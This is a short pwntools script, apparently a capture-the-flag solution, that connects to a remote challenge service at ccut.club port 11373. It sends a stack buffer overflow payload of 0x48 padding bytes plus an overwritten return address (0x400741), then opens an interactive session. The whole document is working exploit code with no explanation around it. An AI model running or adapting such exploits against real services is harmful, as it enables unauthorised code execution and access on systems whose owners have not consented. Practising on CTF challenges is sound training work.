from pwn import *
context.log_level = 'debug'
io = remote('ccut.club',11373)
io.recvuntil(b'string!\n')
payload = b'a'*0x48 + p64(0x400741)
io.sendline(payload)
io.interactive()
